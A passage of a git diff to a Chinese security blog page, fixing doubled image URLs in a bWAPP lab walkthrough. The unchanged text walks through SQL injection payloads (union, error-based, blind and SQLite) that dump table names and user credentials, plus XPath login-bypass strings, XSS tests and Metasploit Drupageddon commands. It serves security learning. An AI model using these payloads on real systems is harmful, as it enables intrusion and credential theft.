 <pre><code>用户名:  ' union select 1,database(),&quot;77de68daecd823babbb58edb1c8e14d7106e83bb&quot;,4,(select group_concat(table_name) from information_schema.tables where table_schema=database()),6,7,8,9 #
 密码  :  3
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1620731807822.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1620731807822.png" alt="" loading="lazy"><br>
 users表的所有字段</p>
 <pre><code>用户名:  ' union select 1,database(),&quot;77de68daecd823babbb58edb1c8e14d7106e83bb&quot;,4,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot; and table_schema=database()),6,7,8,9 #
 密码  :  3
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1620731812892.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1620731812892.png" alt="" loading="lazy"><br>
 爆值</p>
 <pre><code>用户名:  ' union select 1,database(),&quot;77de68daecd823babbb58edb1c8e14d7106e83bb&quot;,4,(select group_concat('~',login,'~',password) from users),6,7,8,9 #
 密码  :  3
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1620731818162.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1620731818162.png" alt="" loading="lazy"><br>
 <strong>Medium&amp;High</strong><br>
 查看源码发现对用户名和密码进行了相应的防护:<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620731824124.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620731824124.png" alt="" loading="lazy"><br>
 分别用了addslashes()和mysql_real_escape_string()函数防御,<br>
 且在mysql编码为utf-8, 无法用宽字节绕过, 安全。</p>
 <h1 id="sql-injection-sqlite">SQL Injection (SQLite)</h1>
@@ -625,7 +625,7 @@ apt-get install php5-sqlite
 </code></pre>
 <p>然后重启一下apache:<br>
 service apache2 restart<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620728399038.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620728399038.png" alt="" loading="lazy"><br>
 SQLite介绍<br>
 SQLite含有一张内置表&quot;sqlite_master&quot;,表里存储着type,name,tbl_name,rootpage,sql五个字段。<br>
 type列记录了项目的类型，如table,index,view,trigger<br>
@@ -635,55 +635,55 @@ rootpage记录项目在数据库页中存储的编号。对于视图和触发器
 sql存放着所有的表的创建语句，即表的结构。<br>
 <strong>1.low</strong><br>
 注入单引号，只会报错 Error:HY000,可能是sqlite的报错标注：<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620729680952.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620729680952.png" alt="" loading="lazy"><br>
 根据查询功能，很明显为模糊匹配：<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620729686729.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620729686729.png" alt="" loading="lazy"><br>
 于是得出sql语句为：<br>
 select * from books where title='%$title%';<br>
 判断注入点</p>
 <pre><code>Iron%' and 1=1 --
 </code></pre>
 <p>注意在sqlite中，注释符为：--<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620729690041.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620729690041.png" alt="" loading="lazy"><br>
 判断字段数</p>
 <pre><code>Iron%' order by 6 --
 </code></pre>
 <p>判断字段显示顺序</p>
 <pre><code>123%' union select 1,2,3,4,5,6 --
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1620729694271.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1620729694271.png" alt="" loading="lazy"><br>
 爆出所有表</p>
 <pre><code>123%' union select 1,sqlite_version(),name,4,5,6 from sqlite_master --
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1620729698710.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1620729698710.png" alt="" loading="lazy"><br>
 users表的字段</p>
 <pre><code>123%' union select 1,sqlite_version,sql,4,5,6 from sqlite_master --
 </code></pre>
 <p>通过sql可以查看建表语句，从而得到字段属性：<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620729703818.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620729703818.png" alt="" loading="lazy"><br>
 取值</p>
 <pre><code>123%' union select 1,2,login,password,5,6 from users --
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1620729707547.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1620729707547.png" alt="" loading="lazy"><br>
 <strong>Medium&amp;High</strong><br>
 在medium和high等级中，都过滤了单引号，无法注入：<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620729711652.png" alt="" loading="lazy"></p>
+<img src="https://jinqipiaopiao.github.io//post-images/1620729711652.png" alt="" loading="lazy"></p>
 <h1 id="drupal-sql-injection-drupageddon完全看不懂">Drupal SQL Injection (Drupageddon)(完全看不懂)</h1>
 <p>CVE-2014-3704:<br>
 翻译一下就是:  由于expandArguments()函数没有正确构造准备好的语句，这使得远程攻击者能够通过包含精心编制的手工语句进行SQL注入攻击。影响Drupal版本在7.x~1.32。</p>
 <p>Drupal是一款开源内容管理系统（CMS），用户多达100万以上（包括政府、电子零售、企业组织、金融机构等），除非已经安装了针对Drupalgeddon 漏洞的安全补丁，否则，所有用户都会面临该漏洞的严重威胁。</p>
 <p>bwapp平台复现了漏洞,  但仅仅再bee-box平台中体现:<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620733259408.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620733259408.png" alt="" loading="lazy"><br>
 由于没有安装bee-box的支持,  所以演示步骤, 不贴结果。具体可移步到 vulhub篇</p>
 <p>直接上msf:</p>
 <p>搜索drupal漏洞:</p>
 <pre><code>search drupal
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1620733263162.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1620733263162.png" alt="" loading="lazy"><br>
 查看漏洞信息:</p>
 <pre><code>show info exploit/multi/http/drupal_drupageddon
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1620733268252.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1620733268252.png" alt="" loading="lazy"><br>
 使用CVE-2014-3704对应的攻击模块:</p>
 <pre><code>use exploit/multi/http/drupal_drupageddon
 </code></pre>
@@ -700,107 +700,107 @@ set rport 8080
 </code></pre>
 <h1 id="sql-injection-stored-blog">SQL Injection - Stored (Blog)</h1>
 <p>一个发表blog的功能<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620736059619.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620736059619.png" alt="" loading="lazy"><br>
 分析<br>
 1.在将blog内容以及事件作者等插入数据库的过程中，肯定用到了insert语句，对应的就可以采用sql注入<br>
 2.观察插入之后的内容，被写入到网页中，这里就类似于存储型xss<br>
 <strong>1.low</strong><br>
 sql注入<br>
 注入单引号，得到回显<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620736064646.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620736064646.png" alt="" loading="lazy"><br>
 所以猜测sql语句为：</p>
 <pre><code>insert into blog(date,entry,owner) values(now(),'$entry','bee');
 </code></pre>
 <p>注入点为entry处，可以将前面的values（）闭合掉，然后再加上注入内容即可<br>
 判断注入点<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620736087372.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620736087372.png" alt="" loading="lazy"><br>
 1。联合查询注入</p>
 <pre><code>test',(select database()))#
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1620736097800.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1620736097800.png" alt="" loading="lazy"><br>
 爆表</p>
 <pre><code>test',(select group_concat(table_name) from information_schema.tables where table_schema=database()))#
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1620736113736.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1620736113736.png" alt="" loading="lazy"><br>
 2.报错注入<br>
 尝试报错注入</p>
 <pre><code>test',(extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))))#
 test',(extractvalue(1,concat(0x7e,(select database()),0x7e))))#
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1620735463361.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1620735463361.png" alt="" loading="lazy"><br>
 然后再尝试xss<br>
 注入</p>
 <pre><code>&lt;script&gt;alert(1)&lt;/script&gt;
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1620736121461.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1620736121461.png" alt="" loading="lazy"><br>
 <strong>medium&amp;high</strong><br>
 注入的单引号发现被转义了:<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620736129705.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620736129705.png" alt="" loading="lazy"><br>
 查看源码，发现两个等级分别用了addslashes（）和mysqli_real_escape_string（）函数做防护：<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620736133750.png" alt="" loading="lazy"><br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620736137137.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620736133750.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620736137137.png" alt="" loading="lazy"><br>
 XSS<br>
 但没有对xss进行相应的防护(只有medium适用，high不适用)</p>
 <pre><code>&lt;scirpt&gt;alert(2)&lt;/script&gt;
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1620736141135.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1620736141135.png" alt="" loading="lazy"><br>
 <strong>SQL Injection -Stored (SQLite)</strong><br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620739936000.png" alt="" loading="lazy"><br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620739942000.png" alt="" loading="lazy"><br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620739946198.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620739936000.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620739942000.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620739946198.png" alt="" loading="lazy"><br>
 Let’s try with single quote<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620739952399.png" alt="" loading="lazy"><br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620739956019.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620739952399.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620739956019.png" alt="" loading="lazy"><br>
 The entry was added but it’s not showing anything which mean we found the SQLi<br>
 Now we have to find the correct syntax so we can see the output of the sqli on the webpage<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620739961314.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620739961314.png" alt="" loading="lazy"><br>
 ’,’’);<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620739979465.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620739979465.png" alt="" loading="lazy"><br>
 As you can see with ’,’’); we could add a blank entry in the blog<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620739985255.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620739985255.png" alt="" loading="lazy"><br>
 ’, sqlite_version());<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620739990150.png" alt="" loading="lazy"><br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620739994558.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620739990150.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620739994558.png" alt="" loading="lazy"><br>
 ’, (SELECT name FROM sqlite_master WHERE type=’table’));<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620740000297.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620740000297.png" alt="" loading="lazy"><br>
 Table name is blog, using this method you can enumerate it further.</p>
 <h1 id="sql-injection-stored-user-agent">SQL Injection - Stored (User-Agent)</h1>
 <p>当用户访问页面时,  后台会获取用户的ip, 访问时间以及http头信息的内容:<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620740563248.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620740563248.png" alt="" loading="lazy"><br>
 并且将获取到的信息存储到数据库,  然后再显示到页面上。</p>
 <p><strong>1.low</strong><br>
 原理同样,  猜测insert的sql语句为:</p>
 <pre><code>INSERT INTO blog (date, user_agent, ip_address) VALUES(now(), '$user-agent','$ip');
 </code></pre>
 <p>抓包,  注入点为 user-agent:<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620740616275.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620740616275.png" alt="" loading="lazy"><br>
 <strong>Medium&amp;High</strong><br>
 查看源码,  发现两个等级分别用了addslashes()和mysqli_real_escape_string()函数做防护, 安全:<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620740647746.png" alt="" loading="lazy"><br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620740653437.png" alt="" loading="lazy"></p>
+<img src="https://jinqipiaopiao.github.io//post-images/1620740647746.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620740653437.png" alt="" loading="lazy"></p>
 <h1 id="sql-injection-storedxml">SQL Injection-Stored(XML)</h1>
 <p><strong>1.low</strong><br>
 当点击按钮后网络中会出现post请求文件打开为sqli_8-2.php<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620783230083.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620783230083.png" alt="" loading="lazy"><br>
 然后抓包猜测sql语句<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620783291927.png" alt="" loading="lazy"><br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620783295114.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620783291927.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620783295114.png" alt="" loading="lazy"><br>
 则猜测sql语句为：</p>
 <pre><code>update users set secret = '$secret' where login = '$login';
 </code></pre>
 <p>因为这里有报错，我们试试报错注入<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620783371442.png" alt="" loading="lazy"><br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620783374943.png" alt="" loading="lazy"><br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620783378636.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620783371442.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620783374943.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620783378636.png" alt="" loading="lazy"><br>
 <strong>medium&amp;high</strong><br>
 已经防御不能注入</p>
 <h1 id="sql-injection-blind-boolean-based">SQL Injection-Blind-Boolean-Based</h1>
 <p><strong>1.low</strong><br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620785227217.png" alt="" loading="lazy"><br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620785232440.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620785227217.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620785232440.png" alt="" loading="lazy"><br>
 一般字符型注入可用#,--+闭合，但是这里说明识别不了#只能识别--+<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620785366274.png" alt="" loading="lazy"><br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620785372615.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620785366274.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620785372615.png" alt="" loading="lazy"><br>
 这里检测database()=3,或者database()=5会发现回显不一样<br>
 <strong>medium&amp;high</strong><br>
 已经防御不能注入<br>
@@ -808,22 +808,22 @@ SQL-Injection-Blind-Time-Based<br>
 <strong>1.low</strong></p>
 <pre><code>title=1'+or+sleep(5)--+
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1620786657411.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1620786657411.png" alt="" loading="lazy"><br>
 发现页面缓冲所以存在延时注入<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620786678476.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620786678476.png" alt="" loading="lazy"><br>
 这里明显不正确。<br>
 所以当length长度为5时，回显正确<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620786812646.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620786812646.png" alt="" loading="lazy"><br>
 说明数据库长度为5<br>
 <strong>medium&amp;high</strong><br>
 同样采用了addslashed()和mysqli_real_escape_string()函数,</p>
 <p>且mysql编码和os编码一致, 无法用宽字节绕过, 安全。</p>
 <h1 id="sql-injection-blind-sqlite">SQL Injection - Blind (SQLite)</h1>
 <p>同样是布尔盲注:<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620792767750.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620792767750.png" alt="" loading="lazy"><br>
 方法思路一样,  和mysql相比只不过是语法不同。</p>
 <h1 id="xmlxpath-injection-login-form">XML/XPath Injection (Login Form)</h1>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1620794842982.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1620794842982.png" alt="" loading="lazy"><br>
 可知是利用了xml/xpath解析的用户登录信息。<br>
 XPath注入的原理其实和sql注入很像， XPath注入攻击主要是通过构建特殊的输入，这些输入往往是XPath语法中的一些组合，这些输入将作为参数传入Web 应用程序，通过执行XPath查询而执行入侵者想要的操作，但是，注入的对象不是数据库users表了，而是一个存储数据的XML文件。攻击者可以获取 XML 数据的组织结构，或者访问在正常情况下不允许访问的数据，如果 XML 数据被用于用户认证，那么攻击者就可以提升他的权限。因为xpath不存在访问控制，所以我们不会遇到许多在SQL注入中经常遇到的访问限制。XML 中没有访问控制或者用户认证，如果用户有权限使用 XPath 查询，并且之间没有防御系统或者查询语句没有被防御系统过滤，那么用户就能够访问整个 XML 文档。 注入出现的位置也就是cookie，headers，request parameters/input等。<br>
 <strong>1.Low</strong><br>
@@ -831,9 +831,9 @@ XPath注入的原理其实和sql注入很像， XPath注入攻击主要是通�
 <p>在Web 应用程序的登录验证程序中，一般有用户名（username）和密码（password） 两个参数，程序会通过用户所提交输入的用户名和密码来执行授权操作。若验证数据存放在XML文件中，其原理是通过查找XML文件中的用户名 （username）和密码（password）的结果来进行授权访问，</p>
 <p>白盒测试<br>
 查看源码得知是通过读取heroes.xml文件的内容, 并且通过xpath寻找用户的账户和密码来验证登录:<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620794965921.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620794965921.png" alt="" loading="lazy"><br>
 继续查看heroes.xml文件内容,  是一个xml文件, 里面包含了用户名和登录密码等信息:<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620794977115.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620794977115.png" alt="" loading="lazy"><br>
 根据xpath语句:</p>
 <pre><code>/heroes/hero[login='$login' and password='$password']
 </code></pre>
@@ -841,22 +841,22 @@ XPath注入的原理其实和sql注入很像， XPath注入攻击主要是通�
 <p>这里注入点选择login参数, 将$login前面的单引号闭合,  加入永真条件1=1,  构造一个万能登录的payload:</p>
 <pre><code>hack' or 1=1 or '
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1620795053972.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1620795053972.png" alt="" loading="lazy"><br>
 <strong>Medium&amp;High</strong><br>
 这两个级别中,  都对xpath语法进行了严格的过滤, 安全:<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620795069328.png" alt="" loading="lazy"></p>
+<img src="https://jinqipiaopiao.github.io//post-images/1620795069328.png" alt="" loading="lazy"></p>
 <h1 id="xmlxpath-injection-search">XML/XPath Injection (Search)</h1>
 <p>这关通过简单的类别搜索来查找电影名称</p>
 <p>如下就是查找科幻类的电影:<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620795745700.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620795745700.png" alt="" loading="lazy"><br>
 <strong>1.Low</strong><br>
 黑盒测试<br>
 通过url更改参数注入单引号,  从得到报错信息得知: 服务端是用了xml的解析<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620795769985.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620795769985.png" alt="" loading="lazy"><br>
 白盒测试<br>
 查看源码, 看到的确是读取了一个包含电影信息的xml文件, 然后再利用xpath提取信息:<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620795808921.png" alt="" loading="lazy"><br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620795812643.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620795808921.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620795812643.png" alt="" loading="lazy"><br>
 关键xpath语句如下:</p>
 <pre><code>//hero[contains(genre, '$genre')]/movie
 </code></pre>
@@ -868,11 +868,11 @@ XPath注入的原理其实和sql注入很像， XPath注入攻击主要是通�
 <p>注入后的xpath语句为:</p>
 <pre><code>//hero[contains(genre, 'horror')]/password | hack[contains(a,'')]/movie
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1620796051036.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1620796051036.png" alt="" loading="lazy"><br>
 当然也有其他payload, 感兴趣的自行脑补。</p>
 <p><strong>Medium&amp;High</strong><br>
 同样对xpath语法进行了严格的过滤, 安全:<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620796073392.png" alt="" loading="lazy"></p>
+<img src="https://jinqipiaopiao.github.io//post-images/1620796073392.png" alt="" loading="lazy"></p>
 <p>原文链接：https://blog.csdn.net/angry_program/article/detail<br>
 原文链接：https://blog.csdn.net/angry_program/article/details/104644236/<br>
 原文链接：https://teckk2.github.io/web-pentesting/2018/02/07/SQL-Injection-Stored-(SQLite).html<br>
@@ -927,7 +927,7 @@ XPath注入的原理其实和sql注入很像， XPath注入攻击主要是通�
         
           <div class="next-post">
             <div class="next">下一篇</div>
-            <a href="https://https://jinqipiaopiao.github.io/post/xss-labs11-20/">
+            <a href="https://jinqipiaopiao.github.io/post/xss-labs11-20/">
               <h3 class="post-title">
                 xss-labs(11-20)
               </h3>
@@ -939,7 +939,7 @@ XPath注入的原理其实和sql注入很像， XPath注入攻击主要是通�
 
         <div class="site-footer">
   Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
-  <a class="rss" href="https://https://jinqipiaopiao.github.io//atom.xml" target="_blank">
+  <a class="rss" href="https://jinqipiaopiao.github.io//atom.xml" target="_blank">
     <i class="ri-rss-line"></i> RSS
   </a>
 </div>
